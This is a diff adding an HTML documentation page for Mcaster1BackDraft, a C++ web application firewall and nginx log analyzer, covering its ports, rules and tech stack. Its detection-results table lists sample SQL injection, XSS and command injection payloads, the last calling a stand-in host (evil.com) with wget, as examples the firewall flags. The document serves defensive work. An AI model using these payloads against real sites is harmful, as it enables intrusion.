@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mcaster1BackDraft Documentation</title>
+<style>
+:root{--bg:#0a0e1a;--card:#1e293b;--border:#334155;--amber:#f59e0b;--text:#e2e8f0;--dim:#94a3b8;--muted:#64748b;--green:#22c55e;--red:#ef4444;--cyan:#0891b2}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Inter','Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.6;padding:40px 20px}
+.container{max-width:900px;margin:0 auto}
+h1{font-size:28px;font-weight:800;margin-bottom:8px;background:linear-gradient(135deg,var(--amber),var(--red));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.sub{color:var(--dim);font-size:14px;margin-bottom:32px}
+h2{font-size:20px;font-weight:700;margin:32px 0 12px;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:8px}
+h3{font-size:16px;font-weight:600;margin:20px 0 8px;color:var(--amber)}
+p{margin-bottom:12px;color:var(--dim);font-size:14px}
+a{color:var(--amber);text-decoration:none}a:hover{text-decoration:underline}
+code{background:#111827;padding:2px 6px;border-radius:4px;font-size:13px;font-family:'SF Mono',monospace;color:var(--amber)}
+pre{background:#111827;padding:16px;border-radius:8px;overflow-x:auto;font-size:13px;line-height:1.5;margin:12px 0;border:1px solid var(--border)}
+pre code{background:none;padding:0;color:var(--text)}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13px}
+th{background:#111827;padding:8px 12px;text-align:left;font-weight:600;color:var(--dim);text-transform:uppercase;font-size:11px;letter-spacing:.06em;border-bottom:1px solid var(--border)}
+td{padding:8px 12px;border-bottom:1px solid #1e293b;color:var(--dim)}
+.card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:20px;margin:16px 0}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+@media(max-width:700px){.grid{grid-template-columns:1fr}}
+.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:700}
+.b-amber{background:rgba(245,158,11,.15);color:var(--amber)}
+.b-green{background:rgba(34,197,94,.15);color:var(--green)}
+.b-red{background:rgba(239,68,68,.15);color:var(--red)}
+.nav{display:flex;gap:12px;margin:24px 0;flex-wrap:wrap}
+.nav a{padding:10px 20px;background:var(--card);border:1px solid var(--border);border-radius:8px;color:var(--text);font-weight:600;font-size:13px;transition:all .15s}
+.nav a:hover{border-color:var(--amber);color:var(--amber);text-decoration:none}
+</style>
+</head>
+<body>
+<div class="container">
+
+<h1>Mcaster1BackDraft</h1>
+<p class="sub">Web Application Firewall + nginx Log Analyzer &mdash; v0.0.1a Documentation</p>
+
+<div class="nav">
+<a href="index.html">Home</a>
+<a href="architecture.html">Architecture</a>
+<a href="getting-started.html">Getting Started</a>
+<a href="waf-rules.html">WAF Rules</a>
+<a href="planning.html">Roadmap</a>
+</div>
+
+<h2>Overview</h2>
+<p>Mcaster1BackDraft is a pure C++ WAF and nginx log analyzer. Single binary, three ports, one process. It sits behind nginx, intercepts proxied traffic on a per-page basis, inspects requests against a rule engine, scores threats, logs everything to MySQL, and forwards clean requests to PHP-FPM via FastCGI.</p>
+
+<div class="grid">
+<div class="card">
+<h3>WAF Engine</h3>
+<p>9 built-in rules covering SQLi, XSS, path traversal, command injection, PHP exploits, empty user agents, and non-standard HTTP methods. URL-decoded inspection catches encoded attacks. Per-request threat scoring with configurable thresholds.</p>
+</div>
+<div class="card">
+<h3>Log Analysis</h3>
+<p>Chart.js-powered dashboards parsing nginx access and error logs directly. Hourly traffic breakdown, status code distribution, top pages, top IPs, top user agents, top referers. Per-site drill-down reports with 6 tabs.</p>
+</div>
+<div class="card">
+<h3>Multi-Site</h3>
+<p>Discovers all nginx sites from <code>/etc/nginx/sites-enabled/</code>. Per-site WAF enrollment with per-page location block generation. Currently 27 sites discovered on this server.</p>
+</div>
+<div class="card">
+<h3>Single Binary</h3>
+<p>One C++ daemon, three ports (9432 WAF, 8862 UI, 8832 API), bounded thread pools auto-sized from system CPU and memory. Built with autotools. No external runtime dependencies beyond MySQL and PHP-FPM.</p>
+</div>
+</div>
+
+<h2>Ports</h2>
+<table>
+<tr><th>Port</th><th>Role</th><th>Auth</th></tr>
+<tr><td><code>9432</code></td><td>WAF proxy &mdash; receives nginx traffic, inspects, forwards to PHP-FPM</td><td>None (nginx-facing)</td></tr>
+<tr><td><code>8862</code></td><td>Web dashboard &mdash; PHP frontend via FastCGI</td><td>Session cookie</td></tr>
+<tr><td><code>8832</code></td><td>REST API &mdash; rules, users, sites, threats, performance</td><td>Bearer token</td></tr>
+</table>
+
+<h2>WAF Detection Results</h2>
+<table>
+<tr><th>Attack</th><th>Payload</th><th>Score</th><th>Action</th></tr>
+<tr><td>SQL Injection</td><td><code>?id=1 UNION SELECT *</code></td><td><span class="badge b-red">80</span></td><td>flag</td></tr>
+<tr><td>XSS</td><td><code>?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td><span class="badge b-red">85</span></td><td>flag</td></tr>
+<tr><td>Command Injection</td><td><code>?cmd=; wget evil.com</code></td><td><span class="badge b-red">95</span></td><td>flag</td></tr>
+<tr><td>Clean Request</td><td><code>/mcaster1amp.php</code></td><td><span class="badge b-green">0</span></td><td>pass</td></tr>
+</table>
+
+<h2>Technology Stack</h2>
+<table>
+<tr><th>Component</th><th>Technology</th></tr>
+<tr><td>Language</td><td>C++17</td></tr>
+<tr><td>Build System</td><td>GNU Autotools (autoconf, automake)</td></tr>
+<tr><td>TLS</td><td>OpenSSL</td></tr>
+<tr><td>Config</td><td>yaml-cpp</td></tr>
+<tr><td>JSON</td><td>nlohmann/json (header-only)</td></tr>
+<tr><td>Database</td><td>MariaDB/MySQL (libmariadb)</td></tr>
+<tr><td>Threading</td><td>pthreads (bounded thread pool)</td></tr>
+<tr><td>Frontend</td><td>PHP 8.2 via FastCGI, Chart.js, vanilla CSS/JS</td></tr>
+</table>
+
+<h2>Quick Links</h2>
+<div class="nav">
+<a href="https://mcaster1.com:8862/login.php">Dashboard Login</a>
+<a href="https://mcaster1.com:8862/dashboard.php">Dashboard</a>
+<a href="https://mcaster1.com:8862/rules.php">WAF Rules</a>
+<a href="https://mcaster1.com:8862/analytics.php">Log Analytics</a>
+<a href="https://mcaster1.com:8862/sites.php">Sites</a>
+</div>
+
+<p style="margin-top:40px;color:var(--muted);font-size:12px">&copy; 2026 Mcaster1 / David St. John. All rights reserved.</p>
+
+</div>
+</body>
+</html>
